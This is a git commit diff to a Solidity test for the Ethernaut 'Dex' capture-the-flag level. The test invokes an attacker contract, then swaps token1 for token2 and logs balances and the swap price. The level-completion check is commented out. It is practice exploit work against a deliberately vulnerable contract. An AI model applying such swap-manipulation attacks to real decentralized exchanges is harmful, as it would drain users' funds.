fe2dab75549bee53a57ccd87a5311da3276abfe5
Joe Jordan <dev@ignitesoft.com>
2022-09-18 23:18:41 -0400

    dex experiments

--- test/Dex/Dex.t.sol
+++ test/Dex/Dex.t.sol
@@ -37,14 +37,23 @@ contract DexAttackTest is PRBTest {
     // test with withrawPartner set directly
     function testDexAttack() public {
 
-        attacker.attack(dexInstance);
-
-        // test to make sure we completed the level
         vm.startPrank(playerAddress, playerAddress);
-        // submit level as player
-        bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
-        assert(levelComplete);
-        vm.stopPrank();
+
+        attacker.attack(dexInstance);
+        uint myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
+        SwappableToken(token1).approve(playerAddress, dexInstance, myToken1Balance);
+        console.log("MY TOKEN1 BALANCE BEFORE:", myToken1Balance);
+        Dex(dexInstance).swap(token1, token2, myToken1Balance);
+        myToken1Balance = SwappableToken(token1).balanceOf(playerAddress);
+        console.log("MY TOKEN1 BALANCE AFTER:", myToken1Balance);
+        console.log("MY TOKEN1 PRICE AFTER:", Dex(dexInstance).getSwapPrice(token1, token2, 10));
+
+        // // test to make sure we completed the level
+        // vm.startPrank(playerAddress, playerAddress);
+        // // submit level as player
+        // bool levelComplete = ethernaut.submitLevelInstance(payable(dexInstance));
+        // assert(levelComplete);
+        // vm.stopPrank();
     }
 
 }
